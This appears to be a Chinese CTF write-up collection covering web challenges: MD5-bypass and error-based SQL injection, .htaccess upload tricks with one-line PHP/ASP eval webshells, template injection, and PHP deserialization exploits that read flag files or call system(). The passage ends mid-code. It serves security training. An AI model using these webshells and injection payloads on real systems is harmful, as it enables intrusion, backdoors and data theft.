# wp

## Easy MD5(sql注入+MD5绕过)

1. sql注入中md5绕过

    ```mysql
    select * from 'admin' where password=md5($pass,true)
    ```

    md5(string, raw)

    | 参数 | 描述 |
    |-----|-----|
    | string | 必须。要计算的字符串 |
    | raw | 可选，默认false,32位16进制字符串;True。16位原始二进制字符串 |

    当raw为True时，md5值经过hex转成字符串后为`'or' xxxxx`这样的字符串，则拼接后的sql语句为：

    ```mysql
        select * from `admin` where password='' or 'xxxxx'
    ```

    所以需要保证or后面的值为true，
    - mysql特性:'xxxxx'以非0数字开头即为true
    - 这里提供一个常用的字符串
    `ffifdyop`

2. 代码审计
    - 如下php代码中的比较为弱等于(eg. "==", "!=")，开头相等即可

        ```php
        $a = $GET['a'];
        $b = $_GET['b'];

        if($a != $b && md5($a) == md5($b)){
        // wow, glzjin wants a girl friend.
        ```

        常见MD5碰撞组合

        ```md
        s878926199a                       //原始字符串
        0e545993274517709034328855841020  //md5值
        s155964671a
        0e342768416822451524974117254469
        s214587387a
        0e848240448830537924465865611904
        s214587387a
        0e848240448830537924465865611904
        s878926199a
        0e545993274517709034328855841020
        s1091221200a
        0e940624217856561557816327384675
        s1885207154a
        0e509367213418206700842008763514
        s1502113478a
        0e861580163291561247404381396064
        s1885207154a
        0e509367213418206700842008763514
        s1836677006a
        0e481036490867661113260034900752
        s155964671a
        0e342768416822451524974117254469
        s1184209335a
        0e072485820392773389523109082030
        s1665632922a
        0e731198061491163073197128363787
        s1502113478a
        0e861580163291561247404381396064
        s1836677006a
        0e481036490867661113260034900752
        s1091221200a
        0e940624217856561557816327384675
        s155964671a
        0e342768416822451524974117254469
        s1502113478a
        0e861580163291561247404381396064
        s155964671a
        0e342768416822451524974117254469
        s1665632922a
        0e731198061491163073197128363787
        s155964671a
        0e342768416822451524974117254469
        s1091221200a
        0e940624217856561557816327384675
        s1836677006a
        0e481036490867661113260034900752
        s1885207154a
        0e509367213418206700842008763514
        s532378020a
        0e220463095855511507588041205815
        s878926199a
        0e545993274517709034328855841020
        s1091221200a
        0e940624217856561557816327384675
        s214587387a
        0e848240448830537924465865611904
        s1502113478a
        0e861580163291561247404381396064
        s1091221200a
        0e940624217856561557816327384675
        s1665632922a
        0e731198061491163073197128363787
        s1885207154a
        0e509367213418206700842008763514
        s1836677006a
        0e481036490867661113260034900752
        s1665632922a
        0e731198061491163073197128363787
        ```

    - PHP数组绕过，由于哈希函数无法处理php数组，在遇到数组时返回false，我们就可以利用false==false使条件成立

        ```url
        /levels91.php?a[]=1&b[]=2      //a不等于b
        ```

    - 下方代码中的比较为强比较,即只能采用php数组绕过

        ```php
         <?php

        error_reporting(0);
        include "flag.php";

        highlight_file(__FILE__);

        if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
            echo $flag;
        }
        ```

## MRCTF2020 文件上传漏洞(.htaccess+一句话木马)——菜刀/蚁剑

1. .htaccess 简介：
   .htaccess文件(或者"分布式配置文件")提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
   概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
   启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。
   笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。
2. .htaccess利用：
   1. 这里时是要包含所有文件带有lx1的文件（只要文件名里面有lx1都可以），都会被当成php代码执行

        ```.htaccess
            <FilesMatch "lx1">
            SetHandler application/x-httpd-php
            </FilesMatch>
        ```

   2. 这种方法时，后面的.png或者.jpg文件能被当成php代码执行，如果想换成别的改扩展名就可以

        ```.htaccess
            AddType application/x-httpd-php .png
            AddType application/x-httpd-php .jpg
        ```

3. 上传完.htaccess后，再上传菜刀,(菜刀名称需要和.htaccess中的一致)
   *每次上传文件都需要BP抓包，修改Content-Type*

   ```php
    php:<?@eval($_POST['cmd']);?>
    asp:<% request('cmd') %>
    aspx:<%@ Page Language="Jscript"%><% eval(Request.Item['cmd'],"unsafe");%>

   ```

4. 利用蚁剑连接，得到网站目录

## 羊城杯2020 easyphp(.htaccess制造后门)

1. 源码

```php
 $files = scandir('./');                          #文件目录
    foreach($files as $file) {                    #循环目录下文件文件
        if(is_file($file)){                       #如果文件不是 index.php
            if ($file !== "index.php") {
                unlink($file);                    #删除
            }
        }
    }
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {    #需要传filenamecontent
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];                             #内容过滤
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {         #文件名过滤
        echo "Hacker";
        die();
    }
    $files = scandir('./');                          
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {               #如果不是index.php则删除
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nHello, world");    #写入文件。
?>
```

2. 解题

一开始想着把一句话木马写入文件，但是发现无效，index.php写不进去，其他文件可以写进去但是不能解析。

考虑写入.htaccess文件，它比较灵活，不需要重启服务器，也不需要管理员权限。其格式为php_value 名称 值，在这里写入木马（以注释的方式），然后在页面顶部加载它（auto_prepend_file）就行：

```htaccess
php_value auto_prepend_file .htaccess
#<?php phpinfo();?>
```

但是过滤了“file”这个关键字，且文件尾部自动加上了"\nHello, world"，无法正常写入，正常写入会因为文件不符合.htaccess的书写规范而报错。为了解决这两个问题，我加了转义符可以换行且转义掉\n：

```htaccess
php_value auto_prepend_fil\
e ".htaccess"
#<?php phpinfo();?>
#\
```
payload: 将上面的内容url编码一下就行

获取flag的话将 # 后面的php语句换成 system('cat /fla?') 就行了

这道题目也有另一种解法

**通过php_value来设置preg_macth正则回溯次数**

```url
?filename=.htaccess&content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\
```
后面的和上一个方法的就差不多了。

## 护网杯2018-easy_tornado(render模板注入)——存在msg

- render简介：render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用
- 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量
- 构造payload

  ```url
    ?msg={{handler.settings}}
  ```

## 极客大挑战2019 Hard SQL(报错注入)

- 注入函数

  - `extractvalue()`

    语法：extractvalue(目标xml文档，xml路径)

    第一个参数 :   第一个参数可以传入目标xml文档

    第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

    *tips:还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串*

    eg. `SELECT extractValue('<a><b></b></a>'', '/a/b')`; 这个语句就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。

    利用`concat`函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。
  - `updatexml()`

    `updatexml()`是一个使用不同的xml标记匹配和替换xml块的函数。

    *作用*：改变文档中符合条件的节点的值

    *语法*： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据

    updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）

    例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。

    eg. `1+and updatexml(1,concat(0x7e,(select database()),0x7e),1)`

  - floor()

    - *原理*：利用`select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;`导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。

    - floor (rand(0)*2)函数

        floor函数的作用就是返回小于等于括号内该值的最大整数。
        rand()本身是返回0~1的随机数，但在后面*2就变成了返回0~2之间的随机数。

        配合上floor函数就可以产生确定的两个数，即0和1。
        并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。

    - count（*）函数

        count（*）函数作用为统计结果的记录数。

        这就是对重复的数据进行整合计数，x就是每个name的数量
  - eg.

    `id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1)) x from information_schema.schemata group by x#`

- payload

    空格 ->  ()
    =    ->  like

    爆破数据库

    `1'or(extractvalue(1,concat(0x7e,(select(database())),0x7e)))`

    爆破表

    `?username=admin&password=admin'or(extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#`

    爆破列

    `1'or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e)))#`

    获取表内信息

    `1'or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e)))#`

    如果substr未过滤的话可以通过substr函数进行两次读取获取完整的flag值

    或者用right函数,获取剩余flag

    `1'or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)),0x7e)))#`

    或者用regexp，原理是当正则匹配到flag值时可以正常返回已经读取到的32位flag值，当匹配错误时，则会返回密码错误

    `1'or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where(password)regexp('^f')),0x7e)))#`

## PHP反序列化

[CTFPHP反序列化总结](https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166234073116781683934559%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166234073116781683934559&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-113588692-null-null.article_score_rank_blog&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4450)

1. php知识了解

    - PHP访问修饰符
        - public 公共的 任何成员都可以访问
        - private 私有的 只有自己可以访问
            - 序列化后会在变量名前加上`\x00类名\x00`
        - protected 保护的 只有当前类的成员与继承该类的类才能访问
            - 序列化后会在变量名前加上`\x00*\x00`

    - PHP类
        - class 创建类

    - PHP关键字
        - function 用于用户声明自定义函数
        - $this-> 表示在类本身内部使用本类的属性或者方法
        - isset 用来检测参数是否存在并且是否具有值

    - PHP常见函数
        - include() 包含函数
        - highlight_file() 函数对文件进行语法高亮显示
        - file_put_contents() 函数把一个字符串写入文件中
        - file_get_contents() 函数把整个文件读入一个字符串中
        - is_valid() 检查对象变量是否已经实例化，即实例变量的值是否是个有效的对象
        - strlen 计算字符串长度
        - ord 用于返回 “S” 的 ASCII值，其语法是ord(string)，参数string必需，指要从中获得ASCII值的字符串

    - PHP魔法函数
        ```php
        __wakeup() //在进行unserialize反序列化的时候，首先查看有无该函数有的话就会先执行他
        __sleep() //serialize之前被调用。若对象比较大，想删减一点再序列化，可考虑一下此函数。
        __destruct() //当删除一个对象或对象操作终止时被调用
        __call()  //对象调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用__call函数。
        __callStatic() //在静态上下文中调用不可访问的方法时触发
        __construct()  //实例化对象时被调用， 当__construct和以类名为函数名的函数同时存在时，__construct将被调用，另一个不被调用。  
        __get() //读取一个对象的属性时，若属性存在，则直接返回属性值； 若不存在，则会调用__get函数。 
        __set() //设置一个对象的属性时， 若属性存在，则直接赋值；若不存在，则会调用__set函数。
        __isset() //在不可访问的属性上调用isset()或empty()触发
        __unset() //在不可访问的属性上使用unset()时触发
        __autoload() //实例化一个对象时，如果对应的类不存在，则该方法被调用。
        __toString() //把类当作字符串使用时触发
        __invoke() //当尝试将对象调用为函数时触发
        ```
    - 反序列化绕过Tips

        1. php7.1+反序列化对类属性不敏感

            我们前面说了如果变量前是protected，序列化结果会在变量名前加上`\x00*\x00`

            但在特定版本7.1以上则对于类属性不敏感，即使没有`\x00*\x00`也依然会正常解析，比如[网鼎杯2019青龙组](#网鼎杯2020-青龙组-反序列化)这道题

        2. 绕过__wakeup(CVE-2016-7124)
   
            ```php
            版本：
            ​ PHP5 < 5.6.25
            ​ PHP7 < 7.0.10
            ```
            利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行

        3. 绕过部分正则

            preg_match('/^O:\d+/')匹配序列化字符串是否是对象字符串开头

            - 利用加号绕过（注意在url里传参时+要编码为%2B）
            - serialize(array(a)); a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)

            ```php
            $a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';
            // +号绕过
            $b = str_replace('O:4','O:+4', $a);
            unserialize(match($b));
            // serialize(array($a));
            unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
            ```

        4. 利用引用

            ```php
            $this->a = 'abc';
            $this->b= &$this->a;
            ```

            上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等

        5. 16进制绕过字符的过滤

            ```php
            O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
            //可以写成
            O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
            //表示字符类型的s大写时，会被当成16进制解析。
            ```

### php类型一--字符串逃逸

#### 安洵杯2019 easy_serialize_php(extract()变量覆盖+反序列化字符串逃逸)

```php
    function filter($img){
        $filter_arr = array('php','flag','php5','php4','fl1g');
        $filter = '/'.implode('|',$filter_arr).'/i';
        return preg_replace($filter,'',$img);
    }
    //这里是将敏感词替换为空，造成了字符减少，我们就有了字符串逃逸的操作空间
```

```php
    $_SESSION["user"] = 'guest';
    $_SESSION['function'] = $function;

    extract($_POST);
    //extract()函数的变量覆盖，使得上面两个参数可控
```

```php
    if($function == 'phpinfo'){
        eval('phpinfo();'); //maybe you can find something in here!
    }else if($function == 'show_image'){
        $userinfo = unserialize($serialize_info);
        echo file_get_contents(base64_decode($userinfo['img']));
    }
    //file_get_contents()函数可以读取敏感文件
    //$userinfo['img']只进行了base64解码，结合前面我们需要让guset_img.png逃逸
    //继续跟进$userinfo['img']的入口，$userinfo = unserialize($serialize_info);  $serialize_info = filter(serialize($_SESSION));
    //所以是$_SESSION序列化后被filter函数处理，再反序列化赋给userinfo，最后取出img这个键对应的值
```

so:

```php
    $_SESSION['imgphpflag'] = ';s:3:"111";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}';

    if(!$_GET['img_path']){
        $_SESSION['img'] = base64_encode('guest_img.png');
    }else{
        $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
    }
    //经过if后_SESSION会添加一个img字段
    //其序列化结果是：s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";
    //经过过滤函数后序列化结果变成a:2:{s:10:"img";s:50:";s:3:"111";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}在反序列化的时候会发生截断，也就是字符串逃逸，if语句中添加的那部分就被截断了
```

本地序列化结果: `a:2:{s:10:"img";s:50:";s:3:"111";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

#### 0CTF2016 piapiapia(备份文件泄露+反序列化字符串逃逸)

1. dirsearch 扫描，发现`www.zip`,发现源码
2. 首先看看config.php，里面有个flag变量
   
   ```php
   $config['hostname'] = '127.0.0.1';
   $config['username'] = 'root';
   $config['password'] = '';
   $config['database'] = '';
   $flag = '';
   ```

   然后是profile.php

   ```php
   $profile = unserialize($profile);
   $phone = $profile['phone'];
   $email = $profile['email'];
   $nickname = $profile['nickname'];
   $photo = base64_encode(file_get_contents($profile['photo']));
   ```

   发现一个敏感函数
   `file_get_contents()`(将一个文件读取到一个字符串中)
   还对`$profile`变量进行了反序列化
   这里我们就有了一个思路，可以使用`file_get_contents`函数读取`config.php`呢。这时候我们再找找`$profile`变量是什么传递过来的

   ```php
   $profile=$user->show_profile($username);
   ```

   继续跟踪`show_profile`方法，因为`profile.php`包含了`class.php`，所以我们去`class.php`寻找

   ```php
      public function show_profile($username) {
         $username = parent::filter($username);
         $where = "username = '$username'";
         $object = parent::select($this->table, $where);
         return $object->profile;
      }
   ```

   发现它对username变量进行了一些处理，调用了父类`filter`方法

   ```php
   public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);
		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
   ```

   username变量进行处理之后，再调用父类的select方法

   ```php
   public function select($table, $where, $ret = '*') {
		$sql = "SELECT $ret FROM $table WHERE $where";
		$result = mysql_query($sql, $this->link);
		return mysql_fetch_object($result);
	}
   ```

   到这里线索似乎就断了，再先看看其他的php
   这里看到`update.php`里面有个`serialize`(序列化操作)

   ```php
   $user->update_profile($username, serialize($profile));
   ```

   调用了`class.php`中user子类的`update_profile`方法，这时我们回到`class.php`

   ```php
   public function update_profile($username, $new_profile) {
      $username = parent::filter($username);
      $new_profile = parent::filter($new_profile);
      $where = "username = '$username'";
      return parent::update($this->table, 'profile', $new_profile, $where);
   }
   ```

   还是经过父类filter方法的处理，继续跟进父类的update方法

   ```php
   public function update($table, $key, $value, $where) {
      $sql = "UPDATE $table SET $key = '$value' WHERE $where";
      return mysql_query($sql);
   }
   ```

   首先数据经过序列化传入到数据库，然后取出的时候反序列化，那么势必需要传入参数，并且构造恶意参数吧，而update.php这个页面我们可以看到是一个数据传入的页面，那么我们就来看看是否存在漏洞。

   ```php
   if(!preg_match('/^\d{11}$/', $_POST['phone']))
	   die('Invalid phone');

   if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
      die('Invalid email');
         
   if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
      die('Invalid nickname');
   ```

   可以看到前两个参数好像都没什么办法绕过，但第三个参数好像可以绕过

   这里我们可以发现前面的正则时匹配所有字母和数字，也就是nickname是字母和数字的话，就是真，而strlen()函数可以使用数组绕过，这样一来nickname就完全被我们控制了。

   ```php
   $profile['phone'] = $_POST['phone'];
   $profile['email'] = $_POST['email'];
   $profile['nickname'] = $_POST['nickname'];
   $profile['photo'] = 'upload/' . md5($file['name']);
   $user->update_profile($username, serialize($profile));
   ```

3. 构造payload
   
   由于需要利用file_get_contents函数读取config.php

   ```php
   <?php
   $profile['phone'] = '18888888888';
   $profile['email'] = 'admin@qq.com';
   $profile['nickname'] = 'admin';
   $profile['photo'] = 'eval.jpg';
   echo serialize($profile);
   ```

   我们需要使序列化的结果为

   ```php
   a:4:{s:5:"phone";s:11:"18888888888";s:5:"email";s:12:"admin@qq.com";s:8:"nickname";s:5:"admin";s:5:"photo";s:10:"config.php";}
   ```

   我们可以控制admin，所以我们可以让nickname为：

   ```php
   ";}s:5:"photo";s:10:"config.php";}
   # 数组序列化之后会多一层`{}`所以再第一个`s`前多了一个`}`
   ```

   序列化结果：

   ```php
   a:4:{s:5:"phone";s:11:"18888888888";s:5:"email";s:12:"admin@qq.com";s:8:"nickname";s:34:""};s:5:"photo";s:10:"config.php";}";s:5:"photo";s:8:"eval.jpg";}
   ```

   此时的payload是无法反序列化的，因为还少34个字符

   ```php
   public function filter($string) {
      $escape = array('\'', '\\\\');
      $escape = '/' . implode('|', $escape) . '/';
      $string = preg_replace($escape, '_', $string);
      $safe = array('select', 'insert', 'update', 'delete', 'where');
      $safe = '/' . implode('|', $safe) . '/i';
      return preg_replace($safe, 'hacker', $string);
   }
   ```

   这里我们发现select,insert,update,delete都是六个字符，唯独where是五个字符，而把where替换成hacker，则多出来一个字符正好可以填充，那么使用34个where就可以解决这个问题

   最终payload

   ```php
   wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
   ```

### 类型二--常规反序列化

[php(phar)反序列化漏洞及各种绕过姿势](https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/)

#### ZJCTF2019 nizhuansiwei(代码审计+php反序列化)

1. 源码

    ```php
        <?php  
        $text = $_GET["text"];
        $file = $_GET["file"];
        $password = $_GET["password"];
        if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
            echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
            if(preg_match("/flag/",$file)){
                echo "Not now!";
                exit(); 
            }else{
                include($file);  //useless.php
                $password = unserialize($password);
                echo $password;
            }
        }
        else{
            highlight_file(__FILE__);
        }
        ?> 
    ```

2. 代码审计--get方式提交参数，text、file、password。
    1. 第一个需要绕过的地方
        `if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`
        - `file_get_contents($text,'r')==="welcome to the zjctf"`,从文件里读取字符串，还要和welcome to the zjctf相等。
  
            用到`data://`写入协议
            payload:`?text=data://text/plain,welcome to the zjctf`
    2. 序列化密码
        - 不可用flag.php访问,被过滤

        ```php
            if(preg_match("/flag/",$file)){
                echo "Not now!";
                exit(); 
            }else{
                include($file);  //useless.php
                $password = unserialize($password);
                echo $password;
            }
        ```

        - 读useless.php:`php://fliter/read=convert.base64-encode/resource=useless.php`,得到base64加密形式的useless.php，解密后得到useless.php源码

        ```php
            <?php
            class Flag{  //flag.php 
                public $file; 
                public function __tostring(){ 
                    if(isset($this->file)){ 
                        echo file_get_contents($this->file);
                        echo "<br>";
                    return ("U R SO CLOSE !///COME ON PLZ");
                    } 
                } 
            } 
            ?> 
        ```

        得到源码之后，我们将这个源码中的$file赋值flag.php，反序列化一下
        得到反序列化的password
        payload:`?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}`

#### [网鼎杯 2018]Fakebook(sql注入+php反序列化)

1. 扫描网站目录(御剑/dirsearch)

   会扫到一个叫*robots.txt*的文件,(一般直接扫描到的flag.php直接访问的话是得不到flag的),通过robots.txt中提示的内容会得到一个后台数据展示处理逻辑的源码。通过代码审计发现存在ssrf漏洞

   ```php
    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }
   ```

   curl_exec()如果使用不当就会导致ssrf(服务端请求伪造)漏洞

2. 手动注册一个账号，blog处会有验证，输入一个网址就可以

   ```php
    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
   ```

3. 注册完成后登录发现用户处可以点击，进去看到url,no这个地方可能存在注入点，然后就是爆库，爆表等等。

   ```url
    http://71601955-9748-4b1d-aaae-0fa3e0652d97.node5.buuoj.cn:81/view.php?no=1
   ```

4. 正式注入，找flag(两种方法)
    1. 查询数据库信息`?no=-1 union/**/select 1,user(),3,4--+`,发现是root权限。
            load_file()函数可以利用绝对路径去加载一个文件。load_file(file_name):file_name是一个完整的路径，于是我们直接用var/www/html/flag.php路径去访问一下这个文件。

        payload: `?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+`

    2. 爆列发现存在一个名为data的列，爆data中的内容，发现是序列化后的字符串

        `O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:21;s:4:"blog";s:7:"abc.com";}`

        改动其中的内容

        `O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}`

        payload: `?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'`

#### 网鼎杯2020 青龙组 反序列化

```php
    <?php

    include("flag.php");

    highlight_file(__FILE__);

    class FileHandler {

        protected $op;
        protected $filename;
        protected $content;

        function __construct() {
            $op = "1";
            $filename = "/tmp/tmpfile";
            $content = "Hello World!";
            $this->process();
        }

        public function process() {
            if($this->op == "1") {
                $this->write();
            } else if($this->op == "2") {
                $res = $this->read();
                $this->output($res);
            } else {
                $this->output("Bad Hacker!");
            }
        }

        private function write() {
            if(isset($this->filename) && isset($this->content)) {
                if(strlen((string)$this->content) > 100) {
                    $this->output("Too long!");
                    die();
                }
                $res = file_put_contents($this->filename, $this->content);
                if($res) $this->output("Successful!");
                else $this->output("Failed!");
            } else {
                $this->output("Failed!");
            }
        }

        private function read() {
            $res = "";
            if(isset($this->filename)) {
                $res = file_get_contents($this->filename);
            }
            return $res;
        }

        private function output($s) {
            echo "[Result]: <br>";
            echo $s;
        }

        function __destruct() {
            if($this->op === "2")
                $this->op = "1";
            $this->content = "";
            $this->process();
        }

    }

    function is_valid($s) {
        for($i = 0; $i < strlen($s); $i++)
            if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
                return false;
        return true;
    }

    if(isset($_GET{'str'})) {

        $str = (string)$_GET['str'];
        if(is_valid($str)) {
            $obj = unserialize($str);
        }

    }
```

1. 方法一

   - PHP 代码审计

        ```php
        public function process() {
            if($this->op == "1") {
                $this->write();
            } else if($this->op == "2") {
                $res = $this->read();
                $this->output($res);
            } else {
                $this->output("Bad Hacker!");
            }
        }
        ```

       op=2，执行read操作

        ```php
        function is_valid($s) {
            for($i = 0; $i < strlen($s); $i++)
                if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
                    return false;
            return true;
        }
        ```

       php序列化的时候,对于private和protected类型的变量会引入不可见字符，private会引入两个`\x00`(其ascii码为0，url编码为`%00`)；protected变量会引入`\x00*\x00` (三个字符)

       绕过`is_valid()`函数判断，`%00`转化为`\00`;但是在反序列化的时候就会出现问题,所以用"S"替换"s",用来指示`\00`是16进制表示的字符串

       - 序列化代码

       ```php
           <?php

           class FileHandler{
               protected $op = 2;
               protected $filename = "flag.php";
               protected $content = "";
           }
           $a = new FileHandler();
           $b = urlencode(serialize($a));
           $b = str_replace("%00", "\\00", $b);
           $b = str_replace("s", "S", $b);
           echo($b);
           echo("\n");

           ?>
       ```

2. 方法二

   - 利用php7.1+对属性类型不敏感,直接在本地序列化的时候改变属性类型。

    ```php
        <?php

        class FileHandler{
            public $op=2;
            public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
            public $content=2;
        }
            $a = new FileHandler();
            echo serialize($a);
        >?  
    ```

#### 网鼎杯2020 朱雀组 php web(反序列化)

首先bp抓包，发现post传参，测试发现后台用的call_user_func()函数

```php
    call_user_func()一种调用函数的方法,假设$a=var_dump,$b=abc,这种调用方法就相当于$a($b)，即var_dump(abc)
```

首先获取源码

```url
    func=file_get_contents&p=index.php
```

代码审计后发现，过滤了大部分函数，但是没有过滤`unserialize()`,所以反序列化，这样就能绕过黑名单检测从而执行系统命令

构造序列化的代码

```php
    <?php

    class Test{
        var $p = "ls /";  //查看flag是否在根目录
        // var $p = "find / -name 'flag*'";  //查找flag
        // var $p = "cat /tmp/flagoefiu4r93";  //获取flag
        var $func = "system";
    }
    $a = new Test();
    $b = serialize($a);
    echo($b);
    ?>
```

***这道题也有另一种解法***

在php中，函数加上\号不会影响函数本身，因为in_array函数过滤不够严谨，所以我们可以利用加上\号来绕过该函数，直接命令执行，构造payload，先找一下flag位置

```url
    func=\system&p=p=find / -name flag*
```

### 类型三--反序列化pop链

#### MRCTF2020 easypop(PHP魔术方法+反序列化)

- 源码

    ```php
        <?php
        //flag is in flag.php
        //WTF IS THIS?
        //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
        //And Crack It!
        class Modifier {
            protected  $var;
            public function append($value){
                include($value);
            }
            public function __invoke(){
                $this->append($this->var);
            }
        }
        class Show{
            public $source;
            public $str;
            public function __construct($file='index.php'){
                $this->source = $file;
                echo 'Welcome to '.$this->source."<br>";
            }
            public function __toString(){
                return $this->str->source;
            }
        
            public function __wakeup(){
                if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
                    echo "hacker";
                    $this->source = "index.php";
                }
            }
        }
        class Test{
            public $p;
            public function __construct(){
                $this->p = array();
            }
            public function __get($key){
